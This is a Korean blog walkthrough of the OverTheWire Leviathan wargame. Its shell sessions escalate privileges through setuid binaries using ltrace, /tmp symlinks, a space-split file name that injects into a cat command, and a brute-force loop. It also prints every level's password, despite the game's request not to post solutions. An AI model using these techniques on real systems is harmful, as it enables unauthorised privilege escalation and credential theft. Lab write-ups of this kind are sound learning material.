---
date: 2026-07-20
draft: false
title: OverTheWire Leviathan
categories: Linux
tags:
  - linux
  - overthewire
  - leviathan
author: grrru
---

> https://overthewire.org/wargames/leviathan/

To login to the first level use:

Username: leviathan0
Password: leviathan0

Leviathan은 Level0 password만 알려주고 그 뒤로는 아무런 정보를 주지 않는다.

## 1. Level 0

```bash
leviathan0@leviathan:~$ ll
total 24
drwxr-xr-x   3 root       root       4096 Jun 24 15:00 ./
drwxr-xr-x 150 root       root       4096 Jun 24 15:02 ../
drwxr-x---   2 leviathan1 leviathan0 4096 Jun 24 15:00 .backup/
-rw-r--r--   1 root       root        220 Feb 13 12:16 .bash_logout
-rw-r--r--   1 root       root       3851 Jun 24 14:50 .bashrc
-rw-r--r--   1 root       root        807 Feb 13 12:16 .profile
```

`.backup`이라는 dir이 있다. group이 leviathan0이어서 읽을 수 있다.


```bash
leviathan0@leviathan:~/.backup$ ll
total 140
drwxr-x--- 2 leviathan1 leviathan0   4096 Jun 24 15:00 ./
drwxr-xr-x 3 root       root         4096 Jun 24 15:00 ../
-rw-r----- 1 leviathan1 leviathan0 133259 Jun 24 15:00 bookmarks.html
```

`bookmarks.html`이라는 수상한 파일이 있다. 출력해보면 엄청 길게 나온다.

대충 `grep leviathan`를 찍어보니 leviathan1 password가 나왔다!

```bash
leviathan0@leviathan:~/.backup$ cat bookmarks.html | grep leviathan
<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is PiXaSWQqHq" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
```

## 2. Level 1

```bash
leviathan1@leviathan:~$ ls -lh
total 16K
-r-sr-x--- 1 leviathan2 leviathan1 15K Jun 24 15:00 check
leviathan1@leviathan:~$ ./check
password: PiXaSWQqHq
Wrong password, Good Bye ...
```

check라는 executable 파일이 있다. group 권한으로 실행 가능해서 실행해봤다. leviathan1의 password를 입력하면 실패한다.

check 파일의 owner의 모드가 `r-s`인데, 여기서 `s`는 `Set ID`를 뜻한다. user permissions의 `x` 자리에 `s`가 있으므로 이 파일을 실행하면 user permissions으로 실행하도록 해준다는 뜻이다.

> ltrace는 리눅스 환경에서 프로그램이 실행되는 동안 호출하는 동적 라이브러리(Shared Library) 함수를 추적하고 분석하는 디버깅 유틸리티입니다.  
> 주로 소스 코드가 없는 프로그램의 동작을 파악하거나 성능 문제를 진단할 때 사용됩니다.

ltrace를 사용하면 executable 파일 등 소스코드를 볼 수 없는 프로그램을 디버깅할 수 있다.

```bash
leviathan1@leviathan:~$ ltrace -C ./check
__libc_start_main(["./check"] <unfinished ...>
printf("password: ")                                                                                             = 10
getchar(0xf7fc5310, 0xf7fc3000, 0x786573, 0x646f67password: test
)                                                              = 116
getchar(0xf7fc5310, 0xf7fc3074, 0x786573, 0x646f67)                                                              = 101
getchar(0xf7fc5310, 0xf7fc6574, 0x786573, 0x646f67)                                                              = 115
strcmp("tes", "sex")                                                                                             = 1
puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
)                                                                             = 29
+++ exited (status 0) +++
 ``` 

여기서 `-C`는 decode low-level symbol names into user-level names.

대충 `test`를 password로 입력해봤다. `strcmp("tes", "sex")`라는 함수를 사용한 걸 보니 세 자리까지만 입력을 받고 뒤의 단어와 비교해서 일치하는지 보는 것 같다.

```bash
leviathan1@leviathan:~$ ./check
password: sex
$ whoami && pwd
leviathan2
/home/leviathan1
 ```

`leviathan2`로 접속하는 데 성공했다.

```bash
$ cd /etc/leviathan_pass
$ cat leviathan2
ERJ9jTYWXE
```

## 3. Level 2

여기부터 어려운 듯 하다 ㅠ.

```bash
leviathan2@leviathan:~$ ll
total 36
drwxr-xr-x   2 root       root        4096 Jun 24 15:00 ./
drwxr-xr-x 150 root       root        4096 Jun 24 15:02 ../
-rw-r--r--   1 root       root         220 Feb 13 12:16 .bash_logout
-rw-r--r--   1 root       root        3851 Jun 24 14:50 .bashrc
-rw-r--r--   1 root       root         807 Feb 13 12:16 .profile
-r-sr-x---   1 leviathan3 leviathan2 15068 Jun 24 15:00 printfile*
```

```bash
leviathan2@leviathan:~$ ltrace -C ./printfile /etc/leviathan_pass/leviathan3
__libc_start_main(["./printfile", "/etc/leviathan_pass/leviathan3"] <unfinished ...>
access("/etc/leviathan_pass/leviathan3", 4)                                                                      = -1
puts("You cant have that file..."You cant have that file...
)                                                                               = 27
+++ exited (status 1) +++
```

`printfile`로 바로 읽을 수 없다.
현재 디렉토리의 `.bash_logout`를 읽는걸 ltrace로 찍어보면 `access`로 권한을 확인하고 `/bin/cat`로 파일을 읽는다는 것을 알 수 있다.

```bash
leviathan2@leviathan:~$ ltrace -C ./printfile .bash_logout
__libc_start_main(["./printfile", ".bash_logout"] <unfinished ...>
access(".bash_logout", 4)                                                                                        = 0
snprintf("/bin/cat .bash_logout", 511, "/bin/cat %s", ".bash_logout")                                            = 21
geteuid()                                                                                                        = 12002
geteuid()                                                                                                        = 12002
setreuid(12002, 12002)                                                                                           = 0
system("/bin/cat .bash_logout"# ~/.bash_logout: executed by bash(1) when login shell exits.

# when leaving the console clear the screen to increase privacy

if [ "$SHLVL" = 1 ]; then
    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
fi
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                           = 0
+++ exited (status 0) +++
```

`printfile`는 levithan2의 read 권한이 있는 파일만 읽을 수 있다. 하지만 내부 동작을 봤듯이 `/bin/cat`은 `levithan3`로 실행하기 때문에(set user id) 파일 권한 통과만 levithan2로 우회하고 `/etc/levithan_pass/levithan3`를 읽으면 된다.

```bash
leviathan2@leviathan:~$ ll /etc/leviathan_pass/leviathan3
-r-------- 1 leviathan3 leviathan3 11 Jun 24 15:00 /etc/leviathan_pass/leviathan3
leviathan2@leviathan:~$ ll .bash_logout
-rw-r--r-- 1 root root 220 Feb 13 12:16 .bash_logout
```

tmp에 아래 두 작업을 한다.

```bash
leviathan2@leviathan:/tmp$ ln -s /etc/leviathan_pass/leviathan3 ./pass
leviathan2@leviathan:/tmp$ touch pass\ test

leviathan2@leviathan:/tmp$ ll pass
lrwxrwxrwx 1 leviathan2 leviathan2 30 Jul 19 06:45 pass@ -> /etc/leviathan_pass/leviathan3
leviathan2@leviathan:/tmp$ ll pass\ test
-rw-rw-r-- 1 leviathan2 leviathan2 0 Jul 19 06:45 pass test
```

`/tmp/pass`에는 levithan3가 symbolic link로 연결되어 있지만 read 권한이 levithan3이다. `/tmp/pass\ test` 파일은 levithan2로 read 가능하기 때문에 `pass test` 파일로 검증을 통과하고 실제 `cat`하는 파일은 `/tmp/pass`를 하면 된다.

`snprintf("/bin/cat /tmp/pass test", 511, "/bin/cat %s", "/tmp/pass test")`와 같이 실행되기 떄문에 `cat /tmp/pass`가 실행되게 된다.

```bash
leviathan2@leviathan:~$ ./printfile /tmp/pass\ test
PiEpxxknZH
cat: test: No such file or directory
```

## 4. Level 3

```bash
leviathan3@leviathan:~$ ll
total 40
drwxr-xr-x   2 root       root        4096 Jun 24 15:00 ./
drwxr-xr-x 150 root       root        4096 Jun 24 15:02 ../
-rw-r--r--   1 root       root         220 Feb 13 12:16 .bash_logout
-rw-r--r--   1 root       root        3851 Jun 24 14:50 .bashrc
-rw-r--r--   1 root       root         807 Feb 13 12:16 .profile
-r-sr-x---   1 leviathan4 leviathan3 18164 Jun 24 15:00 level3*
leviathan3@leviathan:~$ ltrace -C ./level3
__libc_start_main(["./level3"] <unfinished ...>
strcmp("h0no33", "kakaka")                             = -1
printf("Enter the password> ")                         = 20
fgets(Enter the password> test
"test\n", 256, 0xf7fa85a0)                       = 0xffffd26c
strcmp("test\n", "snlprintf\n")                        = 1
puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
)                             = 19
+++ exited (status 0) +++
```

대충 ltrace로 실행해보고 아무 password나 넣어보니 아래쪽에 strcmp로 "snlprintf"와 비교하는 부분이 출력됐다.

password에 "snlprintf"를 넣으면 leviathan4 권한의 쉘이 실행된다.

```bash
leviathan3@leviathan:~$ ./level3
Enter the password> snlprintf
[You've got shell]!
$ id
uid=12004(leviathan4) gid=12003(leviathan3) groups=12003(leviathan3)

$ cat /etc/leviathan_pass/leviathan4
XIyBbRwAPt
```

## 5. Level 4

```bash
dr-xr-x---   2 root leviathan4 4096 Jun 24 15:00 .trash/
leviathan4@leviathan:~$ cd .trash/
leviathan4@leviathan:~/.trash$ ll
total 24
dr-xr-x--- 2 root       leviathan4  4096 Jun 24 15:00 ./
drwxr-xr-x 3 root       root        4096 Jun 24 15:00 ../
-r-sr-x--- 1 leviathan5 leviathan4 14936 Jun 24 15:00 bin*
```

실행 가능한 `bin` 파일 발견. 

실행해보면 이진수가 나오는데, ASCII 문자로 변환하면 password가 나온다.

```bash
leviathan4@leviathan:~/.trash$ ./bin
01000010 01110101 01100010 00111001 01100111 01011010 00110011 01000010 01000111 01010101 00001010
leviathan4@leviathan:~/.trash$ ./bin | perl -pe 's/([01]{8})\s*/chr(oct("0b$1"))/eg'
Bub9gZ3BGU
```

## 6. Level 5

`leviathan5`라는 executable file이 있다. 실행해보면 `/tmp/file.log`를 여는데, 파일이 없다고 한다.
```bash
leviathan5@leviathan:~$ ll
total 36
drwxr-xr-x   2 root       root        4096 Jun 24 15:01 ./
drwxr-xr-x 150 root       root        4096 Jun 24 15:02 ../
-rw-r--r--   1 root       root         220 Feb 13 12:16 .bash_logout
-rw-r--r--   1 root       root        3851 Jun 24 14:50 .bashrc
-rw-r--r--   1 root       root         807 Feb 13 12:16 .profile
-r-sr-x---   1 leviathan6 leviathan5 15140 Jun 24 15:01 leviathan5*
leviathan5@leviathan:~$ ltrace -C ./leviathan5
__libc_start_main(["./leviathan5"] <unfinished ...>
fopen("/tmp/file.log", "r")                                                                                            = nil
puts("Cannot find /tmp/file.log"Cannot find /tmp/file.log
)                                                                                      = 26
exit(-1 <no return ...>
+++ exited (status 255) +++
```

`/tmp/file.log`를 만들어서 `leviathan5`를 실행해보면 입력 그대로 출력한다는 걸 알 수 있다.
```bash
leviathan5@leviathan:~$ touch /tmp/file.log && echo "Hello World" >> /tmp/file.log
leviathan5@leviathan:~$ ./leviathan5
Hello World
```

sympolic link를 leviathan6에 걸어서 출력하면 된다.

```bash
leviathan5@leviathan:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@leviathan:~$ ./leviathan5
JRGj9iWNOb
```

## 7. Level 6

4자리 코드를 찍어 맞춰야 한다.

```bash
leviathan6@leviathan:~$ ./leviathan6
usage: ./leviathan6 <4 digit code>
leviathan6@leviathan:~$ ./leviathan6 1234
Wrong
```

아래 for문으로 반복하면 Wrong이 나오다가 shell에 접속한다.
```bash
for i in {0000..9999}; do ./leviathan6 $i; done
```

```bash
$ whoami
leviathan7
$ pwd
/home/leviathan6
$ cat /etc/leviathan_pass/leviathan7
3zrlkaPTfH
```

## 8. Level 7

```bash
leviathan7@leviathan:~$ cat CONGRATULATIONS
Well Done, you seem to have used a *nix system before, now try something more serious.
(Please don't post writeups, solutions or spoilers about the games on the web. Thank you!)
```
